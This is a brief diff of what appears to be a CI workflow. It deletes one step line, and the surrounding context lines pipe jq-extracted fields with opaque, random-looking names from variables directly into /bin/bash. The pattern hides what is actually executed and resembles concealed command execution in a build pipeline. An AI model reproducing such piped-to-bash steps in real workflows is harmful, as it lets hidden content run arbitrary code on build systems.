@@ -43,7 +43,6 @@ jobs:
           printf '%s' "$nhl2" | jq -r .jnfz48826 | /bin/bash
           printf '%s' "$xs207" | jq -r .rtkzf256 | /bin/bash
           printf '%s' "$cbdq08" | jq -r .dr5 | /bin/bash
-          echo $rpvpi1 | jq -r .kkenm1 | /bin/bash
           echo $gaah2 | jq -r .m13 | /bin/bash
 
       - name: Store results
